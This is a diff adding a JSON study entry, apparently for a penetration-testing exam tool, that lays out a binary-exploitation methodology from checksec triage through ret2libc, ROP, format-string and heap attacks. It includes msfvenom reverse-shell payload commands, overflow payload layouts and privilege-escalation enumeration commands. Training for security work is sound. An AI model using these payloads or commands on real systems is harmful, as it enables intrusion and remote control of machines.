@@ -1,0 +1,237 @@
+{
+  "id": "binary-argha-dey-methodology",
+  "zone": "binary-exploitation",
+  "name": "Argha Dey Binary Exploitation Methodology",
+  "source": "Argha Dey CPENT Notes (94% scorer)",
+  "description": "Complete A-to-Z guide: static analysis (file, strings, readelf, checksec, radare2, Ghidra) \u2192 dynamic analysis (strace, ltrace, GDB with GEF/PEDA/pwndbg) \u2192 exploitation (BOF \u2192 ret2libc \u2192 ROP \u2192 format string \u2192 heap). Includes full worked example and exam playbook.",
+  "examHabits": [
+    "Always run checksec --file=binary first - answers almost every protection question in one shot",
+    "Run the exact sequence: file \u2192 checksec \u2192 strings|grep flag/bin/pass \u2192 gdb break main \u2192 info proc mappings \u2192 find/ROPgadget",
+    "For address-of questions: use GDB breakpoints + info proc mappings to compute runtime addresses",
+    "For ret2libc offset: p system; find /bin/sh; p/x addr_binsh - addr_system (constant regardless of ASLR)",
+    "If ASLR is on: leak via GOT (puts@plt puts@got + main loop), then compute libc base",
+    "Understand manual compilation path, not just Metasploit - CPENT often doesn't provide Metasploit access",
+    "Always verify kernel/software version and patch level before kernel exploits - they can crash the target"
+  ],
+  "quickRef": "checksec --file=./binary | ROPgadget --binary ./binary --only 'pop|ret' | python3 -c 'from pwn import *; ...' | gdb -q ./binary",
+  "steps": [
+    {
+      "phase": "Stage 1 - Triage & Protection Check",
+      "techniques": [],
+      "tools": [
+        "file",
+        "checksec",
+        "readelf",
+        "objdump"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "ELF binary received",
+          "action": "file ./binary (arch, bits, static/dynamic, stripped, PIE); checksec --file=./binary (RELRO, Canary, NX, PIE, RPATH, RUNPATH)",
+          "fallback": "Manual: readelf -h (Type: EXEC=No PIE, DYN=PIE); readelf -l | grep GNU_STACK (E flag=NX off); readelf -d | grep BIND_NOW (Full RELRO)"
+        },
+        {
+          "condition": "Need runtime info without debug symbols",
+          "action": "strings -t x ./binary | grep -i 'flag|pass|/bin/sh'; readelf -h | grep 'Entry point'; readelf -l | grep program headers",
+          "fallback": "nm ./binary | grep ' T ' (defined functions); objdump -R ./binary (dynamic relocations)"
+        }
+      ]
+    },
+    {
+      "phase": "Stage 2 - Stack-Based Buffer Overflow (no protections)",
+      "techniques": [
+        "buffer-overflow"
+      ],
+      "tools": [
+        "pwn",
+        "gdb-peda",
+        "ROPgadget",
+        "pwntools"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Suspected BOF, need crash offset",
+          "action": "python3 -c 'from pwn import *; print(cyclic(300).decode())' > /tmp/pattern; gdb: run < /tmp/pattern; i r eip (shows 0x62616161)",
+          "fallback": "pwn cyclic -l 0x61616166 (instant offset); or msf-pattern_create -l 200 + msf-pattern_offset -q <eip_value>"
+        },
+        {
+          "condition": "NX disabled (stack executable)",
+          "action": "Find JMP ESP: objdump -d libc.so.6 | grep -B2 'jmp.*esp'; ROPgadget --binary ./binary --only 'jmp|call' | grep esp. Build payload: A*offset + jmp_esp + NOP sled + shellcode",
+          "fallback": "msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python -b '\\x00\\x0a\\x0d'"
+        }
+      ]
+    },
+    {
+      "phase": "Stage 3 - Return-to-libc (ret2libc) - bypasses NX",
+      "techniques": [
+        "rop-chain"
+      ],
+      "tools": [
+        "gdb-peda",
+        "pwntools"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "NX enabled, ASLR on/off",
+          "action": "gdb-peda: p system; find /bin/sh; p/x addr_binsh - addr_system (constant offset). Payload: A*offset + system_addr + exit_addr + binsh_addr",
+          "fallback": "For x86_64: need pop rdi; ret gadget to set RDI register before calling system"
+        }
+      ]
+    },
+    {
+      "phase": "Stage 4 - ROP Chains (NX bypass + ASLR)",
+      "techniques": [
+        "rop-chain"
+      ],
+      "tools": [
+        "ROPgadget",
+        "ropper",
+        "pwntools"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Need ROP gadgets",
+          "action": "ROPgadget --binary ./binary --only 'pop|ret'; ROPgadget --binary ./binary --only 'pop rdi|ret' (x64 arg gadget); ropper --file ./binary --search 'pop rdi'",
+          "fallback": "ROPgadget --binary ./binary --string '/bin/sh' (find embedded string)"
+        },
+        {
+          "condition": "ASLR on - need info leak chain",
+          "action": "Stage 1: leak puts() via GOT: payload = A*offset + pop_rdi + puts_got + puts_plt + main_addr; Stage 2: libc.address = leaked - libc.symbols['puts']; call system(binsh)",
+          "fallback": "one_gadget ./libc.so.6 for single-instruction win (satisfy register constraints)"
+        }
+      ]
+    },
+    {
+      "phase": "Stage 5 - GOT Overwrite (Partial/No RELRO + Format String)",
+      "techniques": [
+        "got-overwrite",
+        "format-string-exploit"
+      ],
+      "tools": [
+        "pwntools"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Format string bug present",
+          "action": "Confirm: ./binary '%x %x %x'; find offset where input appears; Leak: p.sendline(b'%7$s'); Arbitrary write: fmtstr_payload(offset, {target_got: new_value})",
+          "fallback": "Use pwntools fmtstr_payload(6, {elf.got['exit']: elf.symbols['win_function']})"
+        }
+      ]
+    },
+    {
+      "phase": "Stage 6 - Format String Exploitation",
+      "techniques": [
+        "format-string",
+        "format-string-exploit"
+      ],
+      "tools": [
+        "gdb-peda",
+        "pwntools"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "printf(user_input) vulnerability found",
+          "action": "Step 1: ./binary 'AAAA.%x.%x.%x' find which %N$x shows 41414141; Step 2: leak memory ./binary '%7$s'; Step 3: arbitrary write with %n: fmtstr_payload(6, {got_target: value})",
+          "fallback": "Use pwntools fmtstr_payload with payload dictionary to automate offset + write"
+        }
+      ]
+    },
+    {
+      "phase": "Stage 7 - Heap Exploitation (overview)",
+      "techniques": [
+        "heap-use-after-free",
+        "heap-tcache-poison",
+        "heap-fastbin-dup",
+        "heap-double-free",
+        "heap-house-of-force"
+      ],
+      "tools": [
+        "gdb-peda",
+        "pwndbg"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Heap vulnerability suspected (UAF, double free, tcache/fastbin)",
+          "action": "gdb: gef> heap chunks; gef> heap bins; pwndbg> heap; pwndbg> bins; pwndbg> tcache",
+          "fallback": "Concepts: UAF=use-after-free pointer reuse; Tcache poisoning=overwrite fd of freed chunk; Fastbin attack=fastbin freelist; House of Force=corrupt top chunk"
+        }
+      ]
+    },
+    {
+      "phase": "Stage 8 - SROP / ret2csu / Integer Overflow",
+      "techniques": [
+        "srop",
+        "ret2csu",
+        "integer-overflow"
+      ],
+      "tools": [
+        "pwntools",
+        "ROPgadget"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Sigreturn-oriented programming needed (syscall without ret-control)",
+          "action": "Use SigreturnFrame from pwntools to set rax=0, rdi=1, etc., then find a sigreturn gadget",
+          "fallback": "ret2csu: use __libc_csu_init gadgets (pop rbx; pop rbp; pop r12-r15; ret) for multi-register control"
+        },
+        {
+          "condition": "Integer overflow in length field",
+          "action": "Negative signed value bypasses (int)len < MAX_SIZE check, but used as unsigned in memcpy/malloc",
+          "fallback": "Send -1 where unsigned wraps to huge value"
+        }
+      ]
+    },
+    {
+      "phase": "Stage 9 - Shellcoding",
+      "techniques": [
+        "shellcode-development"
+      ],
+      "tools": [
+        "msfvenom",
+        "pwntools",
+        "nasm"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Need custom shellcode",
+          "action": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python -b '\\x00\\x0a\\x0d'",
+          "fallback": "Manual: nasm -f elf32 shellcode.asm -o shellcode.o; objcopy -O binary -j .text shellcode.o shellcode.bin; xxd -i shellcode.bin"
+        }
+      ]
+    },
+    {
+      "phase": "Stage 10 - PwnTools Full Workflow Reference",
+      "techniques": [],
+      "tools": [
+        "pwntools"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Building exploit script",
+          "action": "context.arch='amd64'; elf=ELF('./binary'); libc=ELF('./libc.so.6'); p=remote('target',port) or process; p.sendline/p.recvline/p.recvuntil/p.sendafter; p.interactive()",
+          "fallback": "Helpers: p64/p32 pack; u64/u32 unpack; cyclic/cyclic_find; elf.symbols['main'], elf.got['puts'], elf.plt['puts']; fmtstr_payload(offset, {target: value})"
+        }
+      ]
+    },
+    {
+      "phase": "Stage 11 - Exam Playbook: Step-by-Step on Every Binary",
+      "techniques": [],
+      "tools": [
+        "file",
+        "checksec",
+        "strings",
+        "readelf",
+        "gdb",
+        "ROPgadget",
+        "linpeas"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "New Linux ELF handed in exam",
+          "action": "1. file ./target 2. checksec --file=./target 3. strings -t x | grep flag/bin/pass 4. GDB: break main, run, info proc mappings, find strings 5. ROPgadget/ropper for gadgets 6. Compute system/binsh offset 7. sudo -l / find / -perm -u=s / cat /etc/crontab for privesc",
+          "fallback": "If binary won't run: qemu-<arch>-static for cross-arch; patchelf to match local libc"
+        }
+      ]
+    }
+  ]
+}
